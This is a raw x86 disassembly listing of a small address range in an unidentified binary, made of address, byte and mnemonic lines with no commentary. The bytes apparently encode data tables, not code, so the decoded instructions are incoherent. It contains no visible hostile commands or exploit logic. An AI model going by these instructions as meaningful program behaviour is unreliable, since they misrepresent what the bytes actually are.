  406965:	01 26                	add    %esp,(%esi)
  406967:	00 58 4b             	add    %bl,0x4b(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	00 00                	add    %al,(%eax)
  40696e:	11 08                	adc    %ecx,(%eax)
  406970:	7f 16                	jg     0x406988
  406972:	ea 00 27 00 68 4b 00 	ljmp   $0x4b,$0x68002700
  406979:	00 00                	add    %al,(%eax)
  40697b:	00 11                	add    %dl,(%ecx)
  40697d:	08 8b 16 ea 00 28    	or     %cl,0x2800ea16(%ebx)
  406983:	00 48 4c             	add    %cl,0x4c(%eax)
  406986:	00 00                	add    %al,(%eax)
  406988:	00 00                	add    %al,(%eax)
  40698a:	06                   	push   %es
  40698b:	18 46 01             	sbb    %al,0x1(%esi)
  40698e:	13 00                	adc    (%eax),%eax
  406990:	29 00                	sub    %eax,(%eax)
  406992:	50                   	push   %eax
  406993:	4c                   	dec    %esp
  406994:	00 00                	add    %al,(%eax)
  406996:	00 00                	add    %al,(%eax)
  406998:	16                   	push   %ss
  406999:	00 3d 06 24 01 29    	add    %bh,0x29012406
  40699f:	00 6c 4f 00          	add    %ch,0x0(%edi,%ecx,2)
  4069a3:	00 00                	add    %al,(%eax)
  4069a5:	00 11                	add    %dl,(%ecx)
  4069a7:	18 81 01 17 00 2c    	sbb    %al,0x2c001701(%ecx)
  4069ad:	00 90 4f 00 00 00    	add    %dl,0x4f(%eax)
  4069b3:	00 06                	add    %al,(%esi)
  4069b5:	18 46 01             	sbb    %al,0x1(%esi)
  4069b8:	13 00                	adc    (%eax),%eax
  4069ba:	2c 00                	sub    $0x0,%al
  4069bc:	98                   	cwtl
  4069bd:	4f                   	dec    %edi
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	00 00                	add    %al,(%eax)
  4069c2:	16                   	push   %ss
  4069c3:	00 67 06             	add    %ah,0x6(%edi)
  4069c6:	17                   	pop    %ss
  4069c7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4069ca:	b0 4f                	mov    $0x4f,%al
  4069cc:	00 00                	add    %al,(%eax)
  4069ce:	00 00                	add    %al,(%eax)
  4069d0:	11 00                	adc    %eax,(%eax)
  4069d2:	6d                   	insl   (%dx),%es:(%edi)
  4069d3:	06                   	push   %es
  4069d4:	2c 01                	sub    $0x1,%al
  4069d6:	2c 00                	sub    $0x0,%al
  4069d8:	fc                   	cld
  4069d9:	4f                   	dec    %edi
  4069da:	00 00                	add    %al,(%eax)
  4069dc:	00 00                	add    %al,(%eax)
  4069de:	11 00                	adc    %eax,(%eax)
  4069e0:	7a 06                	jp     0x4069e8
  4069e2:	32 01                	xor    (%ecx),%al
  4069e4:	2d 00 f4 52 00       	sub    $0x52f400,%eax
  4069e9:	00 00                	add    %al,(%eax)
  4069eb:	00 11                	add    %dl,(%ecx)
  4069ed:	00 9b 06 39 01 30    	add    %bl,0x30013906(%ebx)
  4069f3:	00 9c 53 00 00 00 00 	add    %bl,0x0(%ebx,%edx,2)
  4069fa:	11 00                	adc    %eax,(%eax)
  4069fc:	b1 06                	mov    $0x6,%cl
  4069fe:	d5 00                	aad    $0x0
  406a00:	31 00                	xor    %eax,(%eax)
  406a02:	00 00                	add    %al,(%eax)
  406a04:	00 00                	add    %al,(%eax)
  406a06:	80 00 11             	addb   $0x11,(%eax)
  406a09:	20 df                	and    %bl,%bh
  406a0b:	06                   	push   %es
  406a0c:	47                   	inc    %edi
  406a0d:	01 31                	add    %esi,(%ecx)
  406a0f:	00 00                	add    %al,(%eax)
  406a11:	00 00                	add    %al,(%eax)
  406a13:	00 80 00 11 20 0c    	add    %al,0xc201100(%eax)
  406a19:	07                   	pop    %es
  406a1a:	50                   	push   %eax
  406a1b:	01 35 00 00 00 00    	add    %esi,0x0
  406a21:	00 80 00 11 20 24    	add    %al,0x24201100(%eax)
  406a27:	07                   	pop    %es
  406a28:	55                   	push   %ebp
  406a29:	01 36                	add    %esi,(%esi)
  406a2b:	00 00                	add    %al,(%eax)
  406a2d:	00 00                	add    %al,(%eax)
  406a2f:	00 80 00 11 20 71    	add    %al,0x71201100(%eax)
  406a35:	03 a3 00 3a 00 00    	add    0x3a00(%ebx),%esp
  406a3b:	00 00                	add    %al,(%eax)
  406a3d:	00 80 00 11 20 40    	add    %al,0x40201100(%eax)
  406a43:	07                   	pop    %es
  406a44:	5d                   	pop    %ebp
  406a45:	01 3b                	add    %edi,(%ebx)
  406a47:	00 00                	add    %al,(%eax)
  406a49:	00 00                	add    %al,(%eax)
  406a4b:	00 80 00 11 20 54    	add    %al,0x54201100(%eax)
  406a51:	07                   	pop    %es
  406a52:	61                   	popa
  406a53:	01 3b                	add    %edi,(%ebx)
  406a55:	00 00                	add    %al,(%eax)
  406a57:	00 00                	add    %al,(%eax)
  406a59:	00 80 00 11 20 80    	add    %al,-0x7fdfef00(%eax)
  406a5f:	07                   	pop    %es
  406a60:	68 01 3d 00 00       	push   $0x3d01
  406a65:	00 00                	add    %al,(%eax)
  406a67:	00 80 00 11 20 94    	add    %al,-0x6bdfef00(%eax)
  406a6d:	07                   	pop    %es
  406a6e:	6d                   	insl   (%dx),%es:(%edi)
  406a6f:	01 3e                	add    %edi,(%esi)
  406a71:	00 00                	add    %al,(%eax)
  406a73:	00 00                	add    %al,(%eax)
  406a75:	00 80 00 11 20 b0    	add    %al,-0x4fdfef00(%eax)
  406a7b:	07                   	pop    %es
  406a7c:	73 01                	jae    0x406a7f
  406a7e:	3f                   	aas
  406a7f:	00 00                	add    %al,(%eax)
  406a81:	00 00                	add    %al,(%eax)
  406a83:	00 80 00 11 20 e5    	add    %al,-0x1adfef00(%eax)
  406a89:	07                   	pop    %es
  406a8a:	78 01                	js     0x406a8d
  406a8c:	40                   	inc    %eax
  406a8d:	00 00                	add    %al,(%eax)
  406a8f:	00 00                	add    %al,(%eax)
  406a91:	00 80 00 11 20 22    	add    %al,0x22201100(%eax)
  406a97:	08 85 01 47 00 50    	or     %al,0x50004701(%ebp)
  406a9d:	54                   	push   %esp
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	00 00                	add    %al,(%eax)
  406aa2:	06                   	push   %es
  406aa3:	18 46 01             	sbb    %al,0x1(%esi)
  406aa6:	13 00                	adc    (%eax),%eax
  406aa8:	49                   	dec    %ecx
  406aa9:	00 00                	add    %al,(%eax)
  406aab:	00 00                	add    %al,(%eax)
  406aad:	00 80 00 16 20 3f    	add    %al,0x3f201600(%eax)
  406ab3:	08 8b 01 49 00 58    	or     %cl,0x58004901(%ebx)
  406ab9:	54                   	push   %esp
  406aba:	00 00                	add    %al,(%eax)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	16                   	push   %ss
  406abf:	00 b5 08 93 01 4c    	add    %dh,0x4c019308(%ebp)
  406ac5:	00 60 54             	add    %ah,0x54(%eax)
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	00 00                	add    %al,(%eax)
  406acc:	16                   	push   %ss
  406acd:	00 d9                	add    %bl,%cl
  406acf:	08 17                	or     %dl,(%edi)
  406ad1:	00 4e 00             	add    %cl,0x0(%esi)
  406ad4:	ac                   	lods   %ds:(%esi),%al
  406ad5:	54                   	push   %esp
  406ad6:	00 00                	add    %al,(%eax)
  406ad8:	00 00                	add    %al,(%eax)
  406ada:	16                   	push   %ss
  406adb:	00 f0                	add    %dh,%al
  406add:	08 17                	or     %dl,(%edi)
  406adf:	00 4e 00             	add    %cl,0x0(%esi)
  406ae2:	e4 54                	in     $0x54,%al
  406ae4:	00 00                	add    %al,(%eax)
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	06                   	push   %es
  406ae9:	18 46 01             	sbb    %al,0x1(%esi)
  406aec:	13 00                	adc    (%eax),%eax
  406aee:	4e                   	dec    %esi
  406aef:	00 ec                	add    %ch,%ah
  406af1:	54                   	push   %esp
  406af2:	00 00                	add    %al,(%eax)
  406af4:	00 00                	add    %al,(%eax)
  406af6:	16                   	push   %ss
  406af7:	00 0a                	add    %cl,(%edx)
  406af9:	09 cc                	or     %ecx,%esp
  406afb:	00 4e 00             	add    %cl,0x0(%esi)
  406afe:	78 55                	js     0x406b55
  406b00:	00 00                	add    %al,(%eax)
  406b02:	00 00                	add    %al,(%eax)
  406b04:	11 18                	adc    %ebx,(%eax)
  406b06:	81 01 17 00 4f 00    	addl   $0x4f0017,(%ecx)
  406b0c:	00 00                	add    %al,(%eax)
  406b0e:	00 00                	add    %al,(%eax)
  406b10:	80 00 16             	addb   $0x16,(%eax)
  406b13:	20 23                	and    %ah,(%ebx)
  406b15:	09 9a 01 4f 00 fc    	or     %ebx,-0x3ffb0ff(%edx)
  406b1b:	55                   	push   %ebp
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	00 00                	add    %al,(%eax)
  406b20:	16                   	push   %ss
  406b21:	00 44 09 9f          	add    %al,-0x61(%ecx,%ecx,1)
  406b25:	01 50 00             	add    %edx,0x0(%eax)
  406b28:	1c 56                	sbb    $0x56,%al
  406b2a:	00 00                	add    %al,(%eax)
  406b2c:	00 00                	add    %al,(%eax)
  406b2e:	16                   	push   %ss
  406b2f:	00 8c 09 e1 01 51 00 	add    %cl,0x5101e1(%ecx,%ecx,1)
  406b36:	00 00                	add    %al,(%eax)
  406b38:	00 00                	add    %al,(%eax)
  406b3a:	80 00 16             	addb   $0x16,(%eax)
  406b3d:	20 a3 09 e6 01 52    	and    %ah,0x5201e609(%ebx)
  406b43:	00 70 56             	add    %dh,0x56(%eax)
  406b46:	00 00                	add    %al,(%eax)
  406b48:	00 00                	add    %al,(%eax)
  406b4a:	16                   	push   %ss
  406b4b:	00 cf                	add    %cl,%bh
  406b4d:	09 f1                	or     %esi,%ecx
  406b4f:	01 53 00             	add    %edx,0x0(%ebx)
  406b52:	ec                   	in     (%dx),%al
  406b53:	56                   	push   %esi
  406b54:	00 00                	add    %al,(%eax)
  406b56:	00 00                	add    %al,(%eax)
  406b58:	16                   	push   %ss
  406b59:	00 0d 0a d1 00 53    	add    %cl,0x5300d10a
  406b5f:	00 00                	add    %al,(%eax)
  406b61:	00 00                	add    %al,(%eax)
  406b63:	00 80 00 16 20 40    	add    %al,0x40201600(%eax)
  406b69:	07                   	pop    %es
  406b6a:	5d                   	pop    %ebp
  406b6b:	01 53 00             	add    %edx,0x0(%ebx)
  406b6e:	00 00                	add    %al,(%eax)
  406b70:	00 00                	add    %al,(%eax)
  406b72:	80 00 16             	addb   $0x16,(%eax)
  406b75:	20 20                	and    %ah,(%eax)
  406b77:	0a f9                	or     %cl,%bh
  406b79:	01 53 00             	add    %edx,0x0(%ebx)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	00 00                	add    %al,(%eax)
  406b80:	80 00 16             	addb   $0x16,(%eax)
  406b83:	20 39                	and    %bh,(%ecx)
  406b85:	0a 01                	or     (%ecx),%al
  406b87:	02 56 00             	add    0x0(%esi),%dl
  406b8a:	48                   	dec    %eax
  406b8b:	57                   	push   %edi
  406b8c:	00 00                	add    %al,(%eax)
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	16                   	push   %ss
  406b91:	00 59 0a             	add    %bl,0xa(%ecx)
  406b94:	17                   	pop    %ss
  406b95:	00 57 00             	add    %dl,0x0(%edi)
  406b98:	80 57 00 00          	adcb   $0x0,0x0(%edi)
  406b9c:	00 00                	add    %al,(%eax)
  406b9e:	16                   	push   %ss
  406b9f:	00 b1 06 d5 00 57    	add    %dh,0x5700d506(%ecx)
  406ba5:	00 e0                	add    %ah,%al
  406ba7:	57                   	push   %edi
  406ba8:	00 00                	add    %al,(%eax)
  406baa:	00 00                	add    %al,(%eax)
  406bac:	16                   	push   %ss
  406bad:	00 66 0a             	add    %ah,0xa(%esi)
  406bb0:	08 02                	or     %al,(%edx)
  406bb2:	57                   	push   %edi
  406bb3:	00 fc                	add    %bh,%ah
  406bb5:	57                   	push   %edi
  406bb6:	00 00                	add    %al,(%eax)
  406bb8:	00 00                	add    %al,(%eax)
  406bba:	16                   	push   %ss
  406bbb:	00 6b 0a             	add    %ch,0xa(%ebx)
  406bbe:	0e                   	push   %cs
  406bbf:	02 58 00             	add    0x0(%eax),%bl
  406bc2:	18 58 00             	sbb    %bl,0x0(%eax)
  406bc5:	00 00                	add    %al,(%eax)
  406bc7:	00 16                	add    %dl,(%esi)
  406bc9:	00 6e 0a             	add    %ch,0xa(%esi)
  406bcc:	d5 00                	aad    $0x0
  406bce:	59                   	pop    %ecx
  406bcf:	00 a8 58 00 00 00    	add    %ch,0x58(%eax)
  406bd5:	00 16                	add    %dl,(%esi)
  406bd7:	00 71 0a             	add    %dh,0xa(%ecx)
  406bda:	14 02                	adc    $0x2,%al
  406bdc:	59                   	pop    %ecx
  406bdd:	00 1c 59             	add    %bl,(%ecx,%ebx,2)
  406be0:	00 00                	add    %al,(%eax)
  406be2:	00 00                	add    %al,(%eax)
  406be4:	16                   	push   %ss
  406be5:	00 84 0a 19 02 5a 00 	add    %al,0x5a0219(%edx,%ecx,1)
  406bec:	84 59 00             	test   %bl,0x0(%ecx)
  406bef:	00 00                	add    %al,(%eax)
  406bf1:	00 16                	add    %dl,(%esi)
  406bf3:	00 93 0a 08 02 5c    	add    %dl,0x5c02080a(%ebx)
  406bf9:	00 f4                	add    %dh,%ah
  406bfb:	59                   	pop    %ecx
  406bfc:	00 00                	add    %al,(%eax)
  406bfe:	00 00                	add    %al,(%eax)
  406c00:	16                   	push   %ss
  406c01:	00 9c 0a 20 02 5d 00 	add    %bl,0x5d0220(%edx,%ecx,1)
  406c08:	94                   	xchg   %eax,%esp
  406c09:	5b                   	pop    %ebx
  406c0a:	00 00                	add    %al,(%eax)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	16                   	push   %ss
  406c0f:	00 a7 0a 20 02 5e    	add    %ah,0x5e02200a(%edi)
  406c15:	00 24 5d 00 00 00 00 	add    %ah,0x0(,%ebx,2)
  406c1c:	16                   	push   %ss
  406c1d:	00 b0 0a 20 02 5f    	add    %dh,0x5f02200a(%eax)
  406c23:	00 98 5d 00 00 00    	add    %bl,0x5d(%eax)
  406c29:	00 16                	add    %dl,(%esi)
  406c2b:	00 be 0a 20 02 60    	add    %bh,0x6002200a(%esi)
  406c31:	00 0c 5e             	add    %cl,(%esi,%ebx,2)
  406c34:	00 00                	add    %al,(%eax)
  406c36:	00 00                	add    %al,(%eax)
  406c38:	16                   	push   %ss
  406c39:	00 d6                	add    %dl,%dh
  406c3b:	0a 9f 00 61 00 30    	or     0x30006100(%edi),%bl
  406c41:	5e                   	pop    %esi
  406c42:	00 00                	add    %al,(%eax)
  406c44:	00 00                	add    %al,(%eax)
  406c46:	16                   	push   %ss
  406c47:	00 e2                	add    %ah,%dl
  406c49:	0a 17                	or     (%edi),%dl
  406c4b:	00 61 00             	add    %ah,0x0(%ecx)
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	00 00                	add    %al,(%eax)
  406c52:	03 00                	add    (%eax),%eax
  406c54:	06                   	push   %es
  406c55:	18 46 01             	sbb    %al,0x1(%esi)
  406c58:	2b 02                	sub    (%edx),%eax
  406c5a:	61                   	popa
  406c5b:	00 00                	add    %al,(%eax)
  406c5d:	00 00                	add    %al,(%eax)
  406c5f:	00 03                	add    %al,(%ebx)
  406c61:	00 46 03             	add    %al,0x3(%esi)
  406c64:	27                   	daa
  406c65:	0b 31                	or     (%ecx),%esi
  406c67:	02 63 00             	add    0x0(%ebx),%ah
  406c6a:	00 00                	add    %al,(%eax)
  406c6c:	00 00                	add    %al,(%eax)
  406c6e:	03 00                	add    (%eax),%eax
  406c70:	46                   	inc    %esi
  406c71:	03 57 0b             	add    0xb(%edi),%edx
  406c74:	3c 02                	cmp    $0x2,%al
  406c76:	68 00 00 00 00       	push   $0x0
  406c7b:	00 03                	add    %al,(%ebx)
  406c7d:	00 46 03             	add    %al,0x3(%esi)
  406c80:	75 0b                	jne    0x406c8d
  406c82:	42                   	inc    %edx
  406c83:	02 69 00             	add    0x0(%ecx),%ch
  406c86:	00 00                	add    %al,(%eax)
  406c88:	00 00                	add    %al,(%eax)
  406c8a:	03 00                	add    (%eax),%eax
  406c8c:	06                   	push   %es
  406c8d:	18 46 01             	sbb    %al,0x1(%esi)
  406c90:	2b 02                	sub    (%edx),%eax
  406c92:	6c                   	insb   (%dx),%es:(%edi)
  406c93:	00 00                	add    %al,(%eax)
  406c95:	00 00                	add    %al,(%eax)
  406c97:	00 03                	add    %al,(%ebx)
  406c99:	00 46 03             	add    %al,0x3(%esi)
  406c9c:	27                   	daa
  406c9d:	0b c6                	or     %esi,%eax
  406c9f:	03 6e 00             	add    0x0(%esi),%ebp
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	00 00                	add    %al,(%eax)
  406ca6:	03 00                	add    (%eax),%eax
  406ca8:	46                   	inc    %esi
  406ca9:	03 57 0b             	add    0xb(%edi),%edx
  406cac:	ce                   	into
  406cad:	03 70 00             	add    0x0(%eax),%esi
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	00 00                	add    %al,(%eax)
  406cb4:	03 00                	add    (%eax),%eax
  406cb6:	46                   	inc    %esi
  406cb7:	03 75 0b             	add    0xb(%ebp),%esi
  406cba:	13 00                	adc    (%eax),%eax
  406cbc:	71 00                	jno    0x406cbe
  406cbe:	40                   	inc    %eax
  406cbf:	4c                   	dec    %esp
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	06                   	push   %es
  406cc5:	18 46 01             	sbb    %al,0x1(%esi)
  406cc8:	13 00                	adc    (%eax),%eax
  406cca:	71 00                	jno    0x406ccc
  406ccc:	78 4b                	js     0x406d19
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	00 00                	add    %al,(%eax)
  406cd2:	06                   	push   %es
  406cd3:	08 73 16             	or     %dh,0x16(%ebx)
  406cd6:	13 00                	adc    (%eax),%eax
  406cd8:	71 00                	jno    0x406cda
  406cda:	00 00                	add    %al,(%eax)
  406cdc:	01 00                	add    %eax,(%eax)
  406cde:	42                   	inc    %edx
  406cdf:	02 00                	add    (%eax),%al
  406ce1:	00 01                	add    %al,(%ecx)
  406ce3:	00 7b 02             	add    %bh,0x2(%ebx)
  406ce6:	00 00                	add    %al,(%eax)
  406ce8:	01 00                	add    %eax,(%eax)
  406cea:	7b 02                	jnp    0x406cee
  406cec:	00 00                	add    %al,(%eax)
  406cee:	01 00                	add    %eax,(%eax)
  406cf0:	81 03 00 00 01 00    	addl   $0x10000,(%ebx)
  406cf6:	a9 03 00 00 02       	test   $0x2000003,%eax
  406cfb:	00 b2 03 00 00 01    	add    %dh,0x1000003(%edx)
  406d01:	00 8f 04 00 00 01    	add    %cl,0x1000004(%edi)
  406d07:	00 d8                	add    %bl,%al
  406d09:	04 00                	add    $0x0,%al
  406d0b:	00 01                	add    %al,(%ecx)
  406d0d:	00 e5                	add    %ah,%ch
  406d0f:	04 00                	add    $0x0,%al
  406d11:	00 01                	add    %al,(%ecx)
  406d13:	00 ec                	add    %ch,%ah
  406d15:	04 00                	add    $0x0,%al
  406d17:	00 01                	add    %al,(%ecx)
  406d19:	00 d8                	add    %bl,%al
  406d1b:	04 00                	add    $0x0,%al
  406d1d:	00 01                	add    %al,(%ecx)
  406d1f:	00 0c 05 00 00 01 00 	add    %cl,0x10000(,%eax,1)
  406d26:	e1 12                	loope  0x406d3a
  406d28:	00 00                	add    %al,(%eax)
  406d2a:	01 00                	add    %eax,(%eax)
  406d2c:	e1 12                	loope  0x406d40
  406d2e:	00 00                	add    %al,(%eax)
  406d30:	01 00                	add    %eax,(%eax)
  406d32:	e5 04                	in     $0x4,%eax
  406d34:	00 00                	add    %al,(%eax)
  406d36:	01 00                	add    %eax,(%eax)
  406d38:	29 05 00 00 01 00    	sub    %eax,0x10000
  406d3e:	ec                   	in     (%dx),%al
  406d3f:	04 00                	add    $0x0,%al
  406d41:	00 01                	add    %al,(%ecx)
  406d43:	00 ec                	add    %ch,%ah
  406d45:	04 00                	add    $0x0,%al
  406d47:	00 01                	add    %al,(%ecx)
  406d49:	00 59 05             	add    %bl,0x5(%ecx)
  406d4c:	00 00                	add    %al,(%eax)
  406d4e:	01 00                	add    %eax,(%eax)
  406d50:	6a 05                	push   $0x5
  406d52:	00 00                	add    %al,(%eax)
  406d54:	01 00                	add    %eax,(%eax)
  406d56:	77 05                	ja     0x406d5d
  406d58:	00 00                	add    %al,(%eax)
  406d5a:	02 00                	add    (%eax),%al
  406d5c:	7b 05                	jnp    0x406d63
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	01 00                	add    %eax,(%eax)
  406d62:	9a 05 00 00 02 00 a9 	lcall  $0xa900,$0x2000005
  406d69:	05 00 00 03 00       	add    $0x30000,%eax
  406d6e:	b1 05                	mov    $0x5,%cl
  406d70:	00 00                	add    %al,(%eax)
  406d72:	04 00                	add    $0x0,%al
  406d74:	b3 05                	mov    $0x5,%bl
  406d76:	00 00                	add    %al,(%eax)
  406d78:	05 00 b5 05 00       	add    $0x5b500,%eax
  406d7d:	00 06                	add    %al,(%esi)
  406d7f:	00 bc 05 00 00 07 00 	add    %bh,0x70000(%ebp,%eax,1)
  406d86:	c4 05 00 00 08 00    	les    0x80000,%eax
  406d8c:	cf                   	iret
  406d8d:	05 00 00 01 00       	add    $0x10000,%eax
  406d92:	f3 05 00 20 02 00    	repz add $0x22000,%eax
  406d98:	fb                   	sti
  406d99:	05 00 00 03 00       	add    $0x30000,%eax
  406d9e:	04 06                	add    $0x6,%al
  406da0:	00 20                	add    %ah,(%eax)
  406da2:	04 00                	add    $0x0,%al
  406da4:	0b 06                	or     (%esi),%eax
  406da6:	00 00                	add    %al,(%eax)
  406da8:	05 00 13 06 00       	add    $0x61300,%eax
  406dad:	00 01                	add    %al,(%ecx)
  406daf:	00 25 06 00 00 02    	add    %ah,0x2000006
  406db5:	00 6a 05             	add    %ch,0x5(%edx)
  406db8:	00 00                	add    %al,(%eax)
  406dba:	01 00                	add    %eax,(%eax)
  406dbc:	36 06                	ss push %es
  406dbe:	00 00                	add    %al,(%eax)
  406dc0:	01 00                	add    %eax,(%eax)
  406dc2:	e1 12                	loope  0x406dd6
  406dc4:	00 00                	add    %al,(%eax)
  406dc6:	01 00                	add    %eax,(%eax)
  406dc8:	e1 12                	loope  0x406ddc
  406dca:	00 00                	add    %al,(%eax)
  406dcc:	01 00                	add    %eax,(%eax)
  406dce:	41                   	inc    %ecx
  406dcf:	06                   	push   %es
  406dd0:	00 00                	add    %al,(%eax)
  406dd2:	02 00                	add    (%eax),%al
  406dd4:	4a                   	dec    %edx
  406dd5:	06                   	push   %es
  406dd6:	00 00                	add    %al,(%eax)
  406dd8:	03 00                	add    (%eax),%eax
  406dda:	29 05 00 00 01 00    	sub    %eax,0x10000
  406de0:	75 06                	jne    0x406de8
  406de2:	00 00                	add    %al,(%eax)
  406de4:	01 00                	add    %eax,(%eax)
  406de6:	87 06                	xchg   %eax,(%esi)
  406de8:	00 00                	add    %al,(%eax)
  406dea:	02 00                	add    (%eax),%al
  406dec:	8d 06                	lea    (%esi),%eax
  406dee:	00 00                	add    %al,(%eax)
  406df0:	03 00                	add    (%eax),%eax
  406df2:	94                   	xchg   %eax,%esp
  406df3:	06                   	push   %es
  406df4:	00 00                	add    %al,(%eax)
  406df6:	01 00                	add    %eax,(%eax)
  406df8:	aa                   	stos   %al,%es:(%edi)
  406df9:	06                   	push   %es
  406dfa:	00 00                	add    %al,(%eax)
  406dfc:	01 00                	add    %eax,(%eax)
  406dfe:	f0 06                	lock push %es
  406e00:	00 00                	add    %al,(%eax)
  406e02:	02 00                	add    (%eax),%al
  406e04:	f7 06 00 00 03 00    	testl  $0x30000,(%esi)
  406e0a:	fc                   	cld
  406e0b:	06                   	push   %es
  406e0c:	00 00                	add    %al,(%eax)
  406e0e:	04 00                	add    $0x0,%al
  406e10:	01 07                	add    %eax,(%edi)
  406e12:	00 00                	add    %al,(%eax)
  406e14:	01 00                	add    %eax,(%eax)
  406e16:	20 07                	and    %al,(%edi)
  406e18:	00 00                	add    %al,(%eax)
  406e1a:	01 00                	add    %eax,(%eax)
  406e1c:	20 07                	and    %al,(%edi)
  406e1e:	00 00                	add    %al,(%eax)
  406e20:	02 00                	add    (%eax),%al
  406e22:	87 06                	xchg   %eax,(%esi)
  406e24:	00 00                	add    %al,(%eax)
  406e26:	03 00                	add    (%eax),%eax
  406e28:	8d 06                	lea    (%esi),%eax
  406e2a:	00 00                	add    %al,(%eax)
  406e2c:	04 00                	add    $0x0,%al
  406e2e:	94                   	xchg   %eax,%esp
  406e2f:	06                   	push   %es
  406e30:	00 00                	add    %al,(%eax)
  406e32:	01 00                	add    %eax,(%eax)
  406e34:	81 03 00 00 01 00    	addl   $0x10000,(%ebx)
  406e3a:	6d                   	insl   (%dx),%es:(%edi)
  406e3b:	07                   	pop    %es
  406e3c:	02 00                	add    (%eax),%al
  406e3e:	02 00                	add    (%eax),%al
  406e40:	72 07                	jb     0x406e49
  406e42:	00 00                	add    %al,(%eax)
  406e44:	01 00                	add    %eax,(%eax)
  406e46:	8c 07                	mov    %es,(%edi)
  406e48:	00 00                	add    %al,(%eax)
  406e4a:	01 00                	add    %eax,(%eax)
  406e4c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406e4d:	07                   	pop    %es
  406e4e:	00 00                	add    %al,(%eax)
  406e50:	01 00                	add    %eax,(%eax)
  406e52:	c2 07 00             	ret    $0x7
  406e55:	00 01                	add    %al,(%ecx)
  406e57:	00 f1                	add    %dh,%cl
  406e59:	07                   	pop    %es
  406e5a:	00 00                	add    %al,(%eax)
  406e5c:	02 00                	add    (%eax),%al
  406e5e:	fa                   	cli
  406e5f:	07                   	pop    %es
  406e60:	00 00                	add    %al,(%eax)
  406e62:	03 00                	add    (%eax),%eax
  406e64:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406e65:	07                   	pop    %es
  406e66:	02 20                	add    (%eax),%ah
  406e68:	04 00                	add    $0x0,%al
  406e6a:	04 08                	add    $0x8,%al
  406e6c:	00 00                	add    %al,(%eax)
  406e6e:	05 00 0d 08 00       	add    $0x80d00,%eax
  406e73:	00 06                	add    %al,(%esi)
  406e75:	00 15 08 00 00 07    	add    %dl,0x7000008
  406e7b:	00 1c 08             	add    %bl,(%eax,%ecx,1)
  406e7e:	00 00                	add    %al,(%eax)
  406e80:	01 00                	add    %eax,(%eax)
  406e82:	30 08                	xor    %cl,(%eax)
  406e84:	00 00                	add    %al,(%eax)
  406e86:	02 00                	add    (%eax),%al
  406e88:	36 08 00             	or     %al,%ss:(%eax)
  406e8b:	20 01                	and    %al,(%ecx)
  406e8d:	00 5b 08             	add    %bl,0x8(%ebx)
  406e90:	00 20                	add    %ah,(%eax)
  406e92:	02 00                	add    (%eax),%al
  406e94:	66 08 00             	data16 or %al,(%eax)
  406e97:	20 03                	and    %al,(%ebx)
  406e99:	00 75 08             	add    %dh,0x8(%ebp)
  406e9c:	00 00                	add    %al,(%eax)
  406e9e:	01 00                	add    %eax,(%eax)
  406ea0:	d0 08                	rorb   $1,(%eax)
  406ea2:	00 00                	add    %al,(%eax)
  406ea4:	02 00                	add    (%eax),%al
  406ea6:	d7                   	xlat   %ds:(%ebx)
  406ea7:	08 00                	or     %al,(%eax)
  406ea9:	00 01                	add    %al,(%ecx)
  406eab:	00 12                	add    %dl,(%edx)
  406ead:	09 00                	or     %eax,(%eax)
  406eaf:	00 01                	add    %al,(%ecx)
  406eb1:	00 3a                	add    %bh,(%edx)
  406eb3:	09 00                	or     %eax,(%eax)
  406eb5:	00 01                	add    %al,(%ecx)
  406eb7:	00 56 09             	add    %dl,0x9(%esi)
  406eba:	00 00                	add    %al,(%eax)
  406ebc:	01 00                	add    %eax,(%eax)
  406ebe:	9c                   	pushf
  406ebf:	09 00                	or     %eax,(%eax)
  406ec1:	00 01                	add    %al,(%ecx)
  406ec3:	00 b4 09 00 00 01 00 	add    %dh,0x10000(%ecx,%ecx,1)
  406eca:	6d                   	insl   (%dx),%es:(%edi)
  406ecb:	07                   	pop    %es
  406ecc:	00 00                	add    %al,(%eax)
  406ece:	02 00                	add    (%eax),%al
  406ed0:	2e 0a 00             	or     %cs:(%eax),%al
  406ed3:	00 03                	add    %al,(%ebx)
  406ed5:	00 33                	add    %dh,(%ebx)
  406ed7:	0a 00                	or     (%eax),%al
  406ed9:	00 01                	add    %al,(%ecx)
  406edb:	00 51 0a             	add    %dl,0xa(%ecx)
  406ede:	00 00                	add    %al,(%eax)
  406ee0:	01 00                	add    %eax,(%eax)
  406ee2:	69 0a 00 00 01 00    	imul   $0x10000,(%edx),%ecx
  406ee8:	e5 04                	in     $0x4,%eax
  406eea:	00 00                	add    %al,(%eax)
  406eec:	01 00                	add    %eax,(%eax)
  406eee:	7a 0a                	jp     0x406efa
  406ef0:	00 00                	add    %al,(%eax)
  406ef2:	01 00                	add    %eax,(%eax)
  406ef4:	56                   	push   %esi
  406ef5:	09 00                	or     %eax,(%eax)
  406ef7:	00 02                	add    %al,(%edx)
  406ef9:	00 8d 0a 00 00 01    	add    %cl,0x100000a(%ebp)
  406eff:	00 8d 0a 00 00 01    	add    %cl,0x100000a(%ebp)
  406f05:	00 12                	add    %dl,(%edx)
  406f07:	09 00                	or     %eax,(%eax)
  406f09:	00 01                	add    %al,(%ecx)
  406f0b:	00 12                	add    %dl,(%edx)
  406f0d:	09 00                	or     %eax,(%eax)
  406f0f:	00 01                	add    %al,(%ecx)
  406f11:	00 12                	add    %dl,(%edx)
  406f13:	09 00                	or     %eax,(%eax)
  406f15:	00 01                	add    %al,(%ecx)
  406f17:	00 12                	add    %dl,(%edx)
  406f19:	09 00                	or     %eax,(%eax)
  406f1b:	00 01                	add    %al,(%ecx)
  406f1d:	00 ff                	add    %bh,%bh
